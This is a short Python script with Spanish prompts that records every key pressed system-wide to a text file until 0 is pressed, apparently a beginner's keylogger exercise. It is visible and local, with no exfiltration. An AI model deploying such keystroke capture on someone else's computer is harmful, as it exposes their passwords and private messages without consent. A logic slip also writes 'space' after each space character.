import keyboard
print("Presiona 0 para salir")
with open("grabado.txt", "a") as archivo:
    def teclaspresionadas(tecla):
        if tecla.name == 'space':
            archivo.write(' ')
        if tecla.name == '@':
            archivo.write('@')
        elif tecla.name == 'enter':
            archivo.write('\n')
        else: 
            archivo.write(tecla.name)
    keyboard.on_press(teclaspresionadas)
    keyboard.wait('0')
print("Grabación finalizada")   